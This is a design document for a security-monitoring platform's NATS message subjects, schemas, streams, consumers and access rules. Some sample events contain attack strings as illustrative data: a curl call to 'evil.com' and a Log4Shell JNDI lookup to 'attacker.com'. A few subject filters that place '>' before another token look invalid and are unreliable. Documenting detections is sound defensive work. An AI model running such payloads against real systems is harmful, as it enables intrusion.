# Kubric NATS Subject Hierarchy

## Overview

All NATS subjects follow the canonical pattern:

```
kubric.{tenant_id}.{domain}.{type}.{version}
```

| Segment     | Description                                                              |
|-------------|--------------------------------------------------------------------------|
| `kubric`    | Platform namespace — all Kubric messages are rooted here                 |
| `tenant_id` | UUID of the tenant (or `internal` / `admin` for platform-level traffic)  |
| `domain`    | Functional domain: `events`, `detection`, `metrics`, `incidents`, etc.   |
| `type`      | Event subtype within the domain                                          |
| `version`   | Schema version (`v1`, `v2`, …) — enables non-breaking schema evolution   |

Wildcards:
- `*` — single token match (e.g. `kubric.*.events.*.*` matches all event types for all tenants)
- `>` — multi-token match (e.g. `kubric.abc123.>` matches all subjects for tenant `abc123`)

---

## Subject Taxonomy

```
kubric.
├── {tenant_id}.
│   ├── events.
│   │   ├── process.v1          — CoreSec process events (OCSF class 4007)
│   │   ├── file.v1             — CoreSec FIM events (OCSF class 4001)
│   │   ├── network.v1          — NetGuard flow events (OCSF class 4003)
│   │   └── auth.v1             — Authentication events (OCSF class 3002)
│   ├── detection.
│   │   ├── sigma.v1            — Sigma rule matches
│   │   ├── yara.v1             — YARA scanner matches
│   │   ├── network_ids.v1      — Network IDS alerts (Suricata / Zeek)
│   │   ├── ad_attack_path.v1   — BloodHound AD path alerts
│   │   └── finding.v1          — Generic detection findings (OCSF class 2004)
│   ├── metrics.
│   │   ├── host.v1             — PerfTrace host metrics (CPU, RAM, disk, net I/O)
│   │   └── agent.v1            — Agent health metrics (heartbeat, queue depth)
│   ├── incidents.
│   │   ├── created.v1          — New correlation engine incidents
│   │   ├── updated.v1          — Incident status changes
│   │   └── resolved.v1         — Incident resolutions
│   ├── vuln.
│   │   ├── nuclei.v1           — Nuclei scan results
│   │   ├── trivy.v1            — Container image scans
│   │   └── cve_enriched.v1     — NVD/EPSS enriched CVEs
│   ├── ti.
│   │   ├── ioc_hit.v1          — Threat intel IOC matches
│   │   └── feed_update.v1      — TI feed updates (MISP, OTX, etc.)
│   └── agent.
│       ├── registered.v1       — New agent provisioning
│       ├── heartbeat.v1        — Agent keepalive
│       ├── status.v1           — Agent status changes
│       └── update_available.v1 — OTA update available notice
├── internal.
│   ├── correlation.rule_triggered.v1  — Correlation engine rule fire
│   ├── thehive.case_created.v1        — TheHive case creation events
│   └── shuffle.workflow_dispatched.v1 — Shuffle/n8n workflow dispatch
└── admin.
    ├── tenant_provisioned.v1   — New tenant onboarded
    └── policy_updated.v1       — Global policy or rule update
```

---

## Subject Reference

### `kubric.{tenant_id}.events.process.v1`

**OCSF Class:** 4007 — Process Activity
**Producer:** CoreSec agent (`agents/coresec`)
**Description:** Emitted for every process creation, termination, or injection event observed by the eBPF probe.

**Message schema:**
```json
{
  "class_uid": 4007,
  "activity_id": 1,
  "time": 1700000000000,
  "severity_id": 1,
  "tenant_id": "uuid",
  "agent_id": "uuid",
  "process": {
    "pid": 12345,
    "name": "bash",
    "cmd_line": "/bin/bash -c 'curl http://evil.com'",
    "parent_pid": 1001,
    "user": { "name": "www-data", "uid": 33 }
  },
  "actor": { "process": { "pid": 1001, "name": "nginx" } }
}
```

---

### `kubric.{tenant_id}.events.file.v1`

**OCSF Class:** 4001 — File System Activity
**Producer:** CoreSec FIM module (`agents/coresec/fim.rs`)
**Description:** File integrity monitoring events for create, modify, delete, rename, and permission-change operations.

**Message schema:**
```json
{
  "class_uid": 4001,
  "activity_id": 2,
  "time": 1700000000000,
  "tenant_id": "uuid",
  "agent_id": "uuid",
  "file": {
    "path": "/etc/passwd",
    "name": "passwd",
    "type_id": 1,
    "size": 2048,
    "hashes": [
      { "algorithm_id": 4, "value": "sha256hex..." }
    ]
  },
  "actor": { "process": { "pid": 9999, "name": "vim" } }
}
```

---

### `kubric.{tenant_id}.events.network.v1`

**OCSF Class:** 4003 — Network Activity
**Producer:** NetGuard agent (`agents/netguard`)
**Description:** Network flow records captured via libpcap/npcap. Published per-flow after connection close or TTL expiry.

**Message schema:**
```json
{
  "class_uid": 4003,
  "activity_id": 6,
  "time": 1700000000000,
  "tenant_id": "uuid",
  "agent_id": "uuid",
  "src_endpoint": { "ip": "10.0.1.5", "port": 52341 },
  "dst_endpoint": { "ip": "192.168.100.10", "port": 443 },
  "protocol_num": 6,
  "traffic": { "bytes_in": 1024, "bytes_out": 512, "packets_in": 8, "packets_out": 6 },
  "tls": { "version": "TLSv1.3", "cipher": "TLS_AES_256_GCM_SHA384", "sni": "example.com" }
}
```

---

### `kubric.{tenant_id}.events.auth.v1`

**OCSF Class:** 3002 — Authentication
**Producer:** CoreSec agent, Wazuh bridge
**Description:** Authentication success/failure events from PAM, SSH, Windows Event Log (Event IDs 4624/4625).

**Message schema:**
```json
{
  "class_uid": 3002,
  "activity_id": 1,
  "time": 1700000000000,
  "tenant_id": "uuid",
  "agent_id": "uuid",
  "user": { "name": "alice", "uid": 1001 },
  "logon_type_id": 3,
  "status_id": 1,
  "src_endpoint": { "ip": "203.0.113.42" }
}
```

---

### `kubric.{tenant_id}.detection.sigma.v1`

**Producer:** Correlation engine (ClickHouse streaming query)
**Description:** SIGMA rule matches. Published whenever a SIGMA detection fires against the event stream.

**Message schema:**
```json
{
  "finding_uid": "uuid",
  "tenant_id": "uuid",
  "rule_id": "sigma-uuid",
  "rule_title": "Suspicious PowerShell Download Cradle",
  "rule_tags": ["attack.execution", "attack.t1059.001"],
  "severity": "high",
  "agent_id": "uuid",
  "trigger_event_ids": ["uuid1", "uuid2"],
  "detected_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.detection.yara.v1`

**Producer:** CoreSec YARA scanner
**Description:** YARA rule hits from memory or file scans.

**Message schema:**
```json
{
  "finding_uid": "uuid",
  "tenant_id": "uuid",
  "rule_name": "Cobalt_Strike_Beacon",
  "rule_namespace": "kubric.malware",
  "matched_file": "/tmp/.crond",
  "sha256": "abc123...",
  "agent_id": "uuid",
  "detected_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.detection.network_ids.v1`

**Producer:** NetGuard IDS module (Suricata integration)
**Description:** Network IDS alerts from Suricata rule matches or anomaly detection.

**Message schema:**
```json
{
  "finding_uid": "uuid",
  "tenant_id": "uuid",
  "signature_id": 2021001,
  "signature": "ET MALWARE CobaltStrike Beacon",
  "category": "A Network Trojan was Detected",
  "severity": 1,
  "src_ip": "10.0.1.5",
  "dst_ip": "192.168.1.100",
  "proto": "TCP",
  "agent_id": "uuid",
  "detected_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.detection.finding.v1`

**OCSF Class:** 2004 — Detection Finding
**Producer:** Any detection subsystem (SIGMA, YARA, IDS, BloodHound)
**Description:** Normalised OCSF detection finding — the canonical cross-source detection event.

**Message schema:**
```json
{
  "class_uid": 2004,
  "activity_id": 1,
  "time": 1700000000000,
  "tenant_id": "uuid",
  "finding_info": {
    "uid": "uuid",
    "title": "Credential Dumping via LSASS",
    "types": ["TTPs"],
    "created_time": 1700000000000
  },
  "severity_id": 4,
  "status_id": 1,
  "attacks": [
    { "tactic": { "uid": "TA0006", "name": "Credential Access" },
      "technique": { "uid": "T1003.001", "name": "LSASS Memory" } }
  ],
  "evidences": [{ "data": "...raw event..." }]
}
```

---

### `kubric.{tenant_id}.metrics.host.v1`

**Producer:** PerfTrace agent (`agents/perftrace`)
**Description:** Host-level performance metrics. Published every 15 seconds by default.

**Message schema:**
```json
{
  "tenant_id": "uuid",
  "agent_id": "uuid",
  "hostname": "prod-web-01",
  "timestamp": "2025-11-01T12:00:00Z",
  "cpu_percent": 42.5,
  "mem_used_bytes": 4294967296,
  "mem_total_bytes": 8589934592,
  "disk_read_bps": 1048576,
  "disk_write_bps": 524288,
  "net_rx_bps": 10485760,
  "net_tx_bps": 5242880,
  "load1": 1.2,
  "load5": 0.9,
  "load15": 0.7
}
```

---

### `kubric.{tenant_id}.metrics.agent.v1`

**Producer:** All agent types (CoreSec, NetGuard, PerfTrace, Watchdog)
**Description:** Agent internal health metrics — event queue depth, error rates, version.

**Message schema:**
```json
{
  "tenant_id": "uuid",
  "agent_id": "uuid",
  "agent_type": "coresec",
  "version": "2.1.0",
  "timestamp": "2025-11-01T12:00:00Z",
  "events_queued": 150,
  "events_published_1m": 3200,
  "errors_1m": 0,
  "memory_rss_bytes": 67108864,
  "uptime_s": 86400
}
```

---

### `kubric.{tenant_id}.incidents.created.v1`

**Producer:** Correlation engine
**Description:** Published when the correlation engine creates a new incident from one or more detection findings.

**Message schema:**
```json
{
  "incident_id": "uuid",
  "tenant_id": "uuid",
  "title": "Lateral Movement via Pass-the-Hash",
  "severity": "critical",
  "status": "open",
  "source": "sigma",
  "mitre_tactics": ["TA0008"],
  "mitre_techniques": ["T1550.002"],
  "affected_agent_ids": ["uuid1", "uuid2"],
  "finding_ids": ["uuid"],
  "detected_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.incidents.updated.v1`

**Producer:** NOC API, KAI agent
**Description:** Emitted when an incident changes status, assignee, or key attributes.

**Message schema:**
```json
{
  "incident_id": "uuid",
  "tenant_id": "uuid",
  "changed_fields": ["status", "assignee"],
  "previous": { "status": "open" },
  "current": { "status": "investigating", "assignee": "analyst@corp.com" },
  "updated_by": "user-uuid",
  "updated_at": "2025-11-01T12:05:00Z"
}
```

---

### `kubric.{tenant_id}.incidents.resolved.v1`

**Producer:** NOC API, KAI remediation
**Description:** Published when an incident is closed with resolution details.

**Message schema:**
```json
{
  "incident_id": "uuid",
  "tenant_id": "uuid",
  "resolution": "confirmed_threat",
  "root_cause": "Phishing email led to malware execution",
  "remediation_actions": ["host_isolated", "credentials_revoked"],
  "resolved_by": "user-uuid",
  "resolved_at": "2025-11-01T13:00:00Z",
  "ttd_s": 1800,
  "ttr_s": 3600
}
```

---

### `kubric.{tenant_id}.vuln.nuclei.v1`

**Producer:** Nuclei bridge (`cmd/nuclei-bridge`)
**Description:** Results from Nuclei vulnerability scans. One message per finding.

**Message schema:**
```json
{
  "scan_id": "uuid",
  "tenant_id": "uuid",
  "template_id": "CVE-2021-44228",
  "template_name": "Log4Shell RCE",
  "severity": "critical",
  "host": "https://target.example.com",
  "matched_at": "https://target.example.com/api",
  "extracted_results": ["jndi:ldap://attacker.com/x"],
  "scanned_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.vuln.cve_enriched.v1`

**Producer:** KAI TI enrichment pipeline
**Description:** CVEs enriched with NVD CVSS scores and EPSS probability.

**Message schema:**
```json
{
  "cve_id": "CVE-2024-12345",
  "tenant_id": "uuid",
  "cvss_v3_score": 9.8,
  "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "epss_score": 0.94,
  "epss_percentile": 0.98,
  "affected_packages": ["org.apache.logging.log4j:log4j-core"],
  "patch_available": true,
  "kev_listed": true,
  "enriched_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.ti.ioc_hit.v1`

**Producer:** Threat intelligence pipeline (MISP, OTX, Shodan bridge)
**Description:** Published when a network or file IOC observed in the tenant environment matches a threat intel feed.

**Message schema:**
```json
{
  "hit_id": "uuid",
  "tenant_id": "uuid",
  "ioc_type": "ip",
  "ioc_value": "203.0.113.42",
  "feed_source": "misp",
  "threat_actor": "APT29",
  "tags": ["c2", "cobalt-strike"],
  "confidence": 0.92,
  "agent_id": "uuid",
  "observed_in_event": "uuid",
  "detected_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.agent.registered.v1`

**Producer:** Watchdog / NOC K-SVC
**Description:** Emitted when a new agent completes enrollment.

**Message schema:**
```json
{
  "agent_id": "uuid",
  "tenant_id": "uuid",
  "hostname": "prod-db-03",
  "os_family": "linux",
  "os_version": "Ubuntu 22.04",
  "agent_version": "2.1.0",
  "enrolled_at": "2025-11-01T12:00:00Z"
}
```

---

### `kubric.{tenant_id}.agent.heartbeat.v1`

**Producer:** All agent types
**Description:** Periodic keepalive. Watchdog raises an alert if no heartbeat is received within the configured TTL (default 90 s).

**Message schema:**
```json
{
  "agent_id": "uuid",
  "tenant_id": "uuid",
  "timestamp": "2025-11-01T12:00:00Z",
  "sequence": 12345
}
```

---

### `kubric.internal.*`

**Access:** Platform services only (not tenant-accessible)

| Subject | Description |
|---------|-------------|
| `kubric.internal.correlation.rule_triggered.v1` | Correlation rule fire event used by the engine's internal fan-out |
| `kubric.internal.thehive.case_created.v1` | Bidirectional sync from TheHive to NOC |
| `kubric.internal.shuffle.workflow_dispatched.v1` | Shuffle/n8n workflow triggered by KAI |

---

### `kubric.admin.*`

**Access:** Super-admin role only

| Subject | Description |
|---------|-------------|
| `kubric.admin.tenant_provisioned.v1` | New tenant successfully onboarded |
| `kubric.admin.policy_updated.v1` | Platform-wide SIGMA/YARA rule update deployed |

---

## JetStream Stream Configurations

All streams use NATS JetStream. Each stream is configured with the following
baseline settings and per-domain overrides.

### Stream: `KUBRIC_EVENTS`

Captures all raw telemetry events from agents.

```yaml
name: KUBRIC_EVENTS
subjects:
  - "kubric.*.events.>"
storage: file
replicas: 3
retention: limits
max_age: 7d          # 7-day hot storage; archive to S3 via Tiered Storage
max_bytes: 100GB
max_msg_size: 1MB
discard: old
duplicate_window: 2m
ack_policy: explicit
```

### Stream: `KUBRIC_DETECTION`

Captures detection findings and correlation engine outputs.

```yaml
name: KUBRIC_DETECTION
subjects:
  - "kubric.*.detection.>"
storage: file
replicas: 3
retention: limits
max_age: 90d
max_bytes: 20GB
max_msg_size: 512KB
discard: old
duplicate_window: 5m
```

### Stream: `KUBRIC_INCIDENTS`

Captures the full incident lifecycle.

```yaml
name: KUBRIC_INCIDENTS
subjects:
  - "kubric.*.incidents.>"
storage: file
replicas: 3
retention: limits
max_age: 365d         # 1-year retention for audit/compliance
max_bytes: 5GB
max_msg_size: 256KB
discard: old
duplicate_window: 10m
```

### Stream: `KUBRIC_METRICS`

High-throughput metrics stream. Shorter retention; metrics aggregated into ClickHouse.

```yaml
name: KUBRIC_METRICS
subjects:
  - "kubric.*.metrics.>"
storage: file
replicas: 2
retention: limits
max_age: 24h
max_bytes: 50GB
max_msg_size: 64KB
discard: old
duplicate_window: 30s
```

### Stream: `KUBRIC_VULN`

Vulnerability scan results and enriched CVEs.

```yaml
name: KUBRIC_VULN
subjects:
  - "kubric.*.vuln.>"
storage: file
replicas: 3
retention: limits
max_age: 180d
max_bytes: 10GB
max_msg_size: 512KB
discard: old
```

### Stream: `KUBRIC_AGENT_MGMT`

Agent lifecycle events — registration, heartbeat, status, OTA.

```yaml
name: KUBRIC_AGENT_MGMT
subjects:
  - "kubric.*.agent.>"
storage: file
replicas: 3
retention: limits
max_age: 30d
max_bytes: 1GB
max_msg_size: 32KB
discard: old
duplicate_window: 5m
```

### Stream: `KUBRIC_INTERNAL`

Internal platform events — not tenant-accessible.

```yaml
name: KUBRIC_INTERNAL
subjects:
  - "kubric.internal.>"
storage: file
replicas: 3
retention: limits
max_age: 14d
max_bytes: 2GB
max_msg_size: 256KB
discard: old
```

### Stream: `KUBRIC_ADMIN`

Admin and provisioning events.

```yaml
name: KUBRIC_ADMIN
subjects:
  - "kubric.admin.>"
storage: file
replicas: 3
retention: limits
max_age: 365d
max_bytes: 1GB
max_msg_size: 128KB
discard: old
```

---

## Consumer Group Patterns

Consumers follow the naming convention: `{service-name}-{tenant-scope}`.

### Durable consumers — push-based

| Consumer Name              | Stream              | Subject Filter                          | Deliver Policy | Service        |
|----------------------------|---------------------|-----------------------------------------|----------------|----------------|
| `correlation-engine-all`   | `KUBRIC_EVENTS`     | `kubric.*.events.>`                     | new            | Correlation    |
| `clickhouse-bridge-events` | `KUBRIC_EVENTS`     | `kubric.*.events.>`                     | new            | CH Bridge      |
| `clickhouse-bridge-detect` | `KUBRIC_DETECTION`  | `kubric.*.detection.>`                  | new            | CH Bridge      |
| `kai-incidents`            | `KUBRIC_INCIDENTS`  | `kubric.*.incidents.created.v1`         | new            | KAI Agent      |
| `noc-incident-notifier`    | `KUBRIC_INCIDENTS`  | `kubric.*.incidents.>`                  | new            | NOC API        |
| `watchdog-heartbeat`       | `KUBRIC_AGENT_MGMT` | `kubric.*.agent.heartbeat.v1`           | new            | Watchdog       |
| `thehive-dispatcher`       | `KUBRIC_INTERNAL`   | `kubric.internal.thehive.>.v1`          | new            | TheHive bridge |

### Ephemeral consumers — pull-based

Used for ad-hoc queries and replay by the NOC API:

```
kubric.{tenant_id}.events.> — pull, start_time = now-24h
kubric.{tenant_id}.detection.> — pull, start_time = now-7d
kubric.{tenant_id}.incidents.> — pull, start_time = now-90d
```

---

## Retention Policies

| Stream              | Hot Retention | Archive         | Legal Hold         |
|---------------------|---------------|-----------------|--------------------|
| `KUBRIC_EVENTS`     | 7 days        | 1 year (S3)     | 7 years on-demand  |
| `KUBRIC_DETECTION`  | 90 days       | 2 years (S3)    | 7 years on-demand  |
| `KUBRIC_INCIDENTS`  | 365 days      | 7 years (S3 IA) | Indefinite (GRC)   |
| `KUBRIC_METRICS`    | 24 hours      | 90 days (S3)    | N/A                |
| `KUBRIC_VULN`       | 180 days      | 3 years (S3)    | N/A                |
| `KUBRIC_AGENT_MGMT` | 30 days       | 1 year (S3)     | N/A                |
| `KUBRIC_INTERNAL`   | 14 days       | N/A             | N/A                |
| `KUBRIC_ADMIN`      | 365 days      | 7 years (S3 IA) | 7 years on-demand  |

Archive offload is implemented by the `nats-clickhouse-bridge` service and the
S3 tiered-storage exporter. Legal holds activate the GRC Evidence Vault
(`K-GRC-EV`) which writes a Blake3-signed evidence bundle to MinIO.

---

## Schema References

| Subject Pattern                            | Schema File / OCSF Class                               |
|--------------------------------------------|--------------------------------------------------------|
| `kubric.*.events.process.v1`               | OCSF 4007 — [Process Activity](https://schema.ocsf.io/classes/process_activity) |
| `kubric.*.events.file.v1`                  | OCSF 4001 — [File System Activity](https://schema.ocsf.io/classes/file_system_activity) |
| `kubric.*.events.network.v1`               | OCSF 4003 — [Network Activity](https://schema.ocsf.io/classes/network_activity) |
| `kubric.*.events.auth.v1`                  | OCSF 3002 — [Authentication](https://schema.ocsf.io/classes/authentication) |
| `kubric.*.detection.finding.v1`            | OCSF 2004 — [Detection Finding](https://schema.ocsf.io/classes/detection_finding) |
| `kubric.*.detection.sigma.v1`              | `proto/kubric/detection/v1/sigma.proto`                |
| `kubric.*.detection.yara.v1`               | `proto/kubric/detection/v1/yara.proto`                 |
| `kubric.*.detection.network_ids.v1`        | `proto/kubric/detection/v1/network_ids.proto`          |
| `kubric.*.incidents.created.v1`            | `proto/kubric/incident/v1/incident.proto`              |
| `kubric.*.metrics.host.v1`                 | Prometheus exposition format + `proto/kubric/metrics/v1/host.proto` |
| `kubric.*.vuln.nuclei.v1`                  | Nuclei SARIF schema + `proto/kubric/vuln/v1/nuclei.proto` |
| `kubric.*.vuln.cve_enriched.v1`            | NVD CVE JSON 5.0 schema                                |
| `kubric.*.ti.ioc_hit.v1`                   | STIX 2.1 indicator + `proto/kubric/ti/v1/ioc.proto`    |
| `kubric.*.agent.heartbeat.v1`              | `proto/kubric/agent/v1/heartbeat.proto`                |

---

## Access Control (NATS Authorization)

NATS authorization is enforced via decentralised JWT accounts. Each service
account is issued scoped permissions:

| Service / Role         | Subscribe                          | Publish                           |
|------------------------|------------------------------------|-----------------------------------|
| CoreSec agent          | (none)                             | `kubric.{tid}.events.{type}.v1`   |
| NetGuard agent         | (none)                             | `kubric.{tid}.events.network.v1`  |
| PerfTrace agent        | (none)                             | `kubric.{tid}.metrics.host.v1`    |
| Watchdog agent         | `kubric.{tid}.agent.update_available.v1` | `kubric.{tid}.agent.{*}.v1` |
| Correlation engine     | `kubric.*.events.>`                | `kubric.*.detection.finding.v1`, `kubric.*.incidents.>.v1` |
| KAI orchestrator       | `kubric.*.incidents.>`, `kubric.*.detection.>` | `kubric.internal.shuffle.workflow_dispatched.v1` |
| NOC API                | `kubric.{tid}.>`                   | `kubric.{tid}.incidents.updated.v1` |
| CH bridge (read-only)  | `kubric.*.events.>`, `kubric.*.detection.>` | (none) |
| Admin super-role       | `kubric.>`                         | `kubric.admin.>`, `kubric.internal.>` |
